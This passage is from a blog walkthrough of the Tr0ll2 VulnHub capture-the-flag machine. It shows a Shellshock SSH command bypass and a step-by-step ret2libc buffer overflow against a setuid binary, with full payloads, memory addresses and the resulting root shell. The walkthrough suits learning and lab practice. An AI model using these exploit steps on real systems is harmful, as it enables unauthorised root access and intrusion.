<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh noob@192.168.56.101 -i noob -t <span class="s1">&#39;() { :;}; /bin/bash&#39;</span>
</span><span class='line'>noob@Tr0ll2:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!"</code> before the public key.</p>

<h2>which door leads to r00t</h2>

<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>

<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>

<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1<span class="nv">$ </span>./r00t
</span><span class='line'>Good job, stand by, executing root shell...
</span><span class='line'>BUHAHAHA NOOB!
</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3<span class="nv">$ </span>
</span><span class='line'>Broadcast message from noob@Tr0ll2
</span><span class='line'>    <span class="o">(</span>/dev/pts/0<span class="o">)</span> at 0:48 ...
</span><span class='line'>
</span><span class='line'>The system is going down <span class="k">for </span>reboot NOW!
</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>

<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely<span class="nv">$ </span>od -S 1 door3/r00t
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>0001214 __libc_start_main
</span><span class='line'>0001236 GLIBC_2.0
</span><span class='line'>0001320 R
</span><span class='line'>0001453 Q
</span><span class='line'>0001521 %
</span><span class='line'>0001526 h
</span><span class='line'>0001626 h
</span><span class='line'>0001646 h<span class="o">(</span>
</span><span class='line'>0002066 t<span class="p">&amp;</span>
</span><span class='line'>0002073 <span class="err">&#39;</span>
</span><span class='line'>0002305 i
</span><span class='line'>0002620 Good job, stand by, executing root shell...
</span><span class='line'>0002674 BUHAHAHA NOOB!
</span><span class='line'>0002713 /sbin/reboot
</span><span class='line'>0002733 <span class="p">;</span>0
</span><span class='line'>0002750 L
</span><span class='line'>0002760 p
</span><span class='line'>0003025 zR
</span><span class='line'>0003044
</span><span class='line'>0003060 p
</span><span class='line'>0003077 x
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>

<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>

<h2>bof bof bof your boat&hellip;</h2>

<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>

<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>

<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./r00t
</span><span class='line'>Reading symbols from /root/Desktop/troll2/r00t...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partia
</span></code></pre></td></tr></table></div></figure>


<p>No security? EZ PEZE.</p>

<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>

<h2>the exploit</h2>

<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>

<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x41414141: Cannot access memory at address 0x41414141
</span></code></pre></td></tr></table></div></figure>


<p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>

<p>Lets generate the pattern.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# locate pattern_create
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb
</span><span class='line'>
</span><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span></code></pre></td></tr></table></div></figure>


<p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
</span><span class='line'>Starting program: /tmp/r00t <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 268
</span></code></pre></td></tr></table></div></figure>


<p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x42424242: Cannot access memory at address 0x42424242
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>

<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># here we break on the main function</span>
</span><span class='line'>Breakpoint 1 at 0x8048444: file bof.c, line 3.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># here we run the application....</span>
</span><span class='line'>Starting program: /tmp/r00t
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffffd84<span class="o">)</span> at bof.c:3
</span><span class='line'>3   bof.c: No such file or directory.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># and leak the locatin of system() in memory</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e6b060 &lt;system&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>

<p>So far our exploit payload will look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK
</span></code></pre></td></tr></table></div></figure>


<p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>

<p>So lets create this string, which we will refer to as the EGG.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>env <span class="p">|</span> grep EGG
</span><span class='line'><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span></code></pre></td></tr></table></div></figure>


<p>Next, we can use a small C program to tell us where this EGG is in memory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>cat /tmp/findegg.c
</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;EGG address: 0x%lx\n&quot;</span>, getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)</span>+4<span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gcc /tmp/findegg.c -o /tmp/findegg
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>/tmp/findegg
</span><span class='line'>EGG address: 0xbfffff04
</span></code></pre></td></tr></table></div></figure>


<p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>

<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK + EGG
</span></code></pre></td></tr></table></div></figure>


<p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># so just to recap, we check for the location of the EGG</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./findegg
</span><span class='line'>EGG address: 0xbfffff04
</span><span class='line'>
</span><span class='line'><span class="c"># EGG is at 0xbfffff04, so in little endian format we have:</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># A segfault, lets move it up 1 byte</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x05\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: <span class="o">=</span>/bin/sh: not found
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># another segfault, however we have a little diagnostics message now</span>
</span><span class='line'><span class="c"># showing that we are not far off :)</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>trollin the rootin</h2>

<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\xe2\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>

<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/Proof.txt</span>
</span><span class='line'>You win this <span class="nb">time </span>young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4
</span></code></pre></td></tr></table></div></figure>


<p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>

      








  


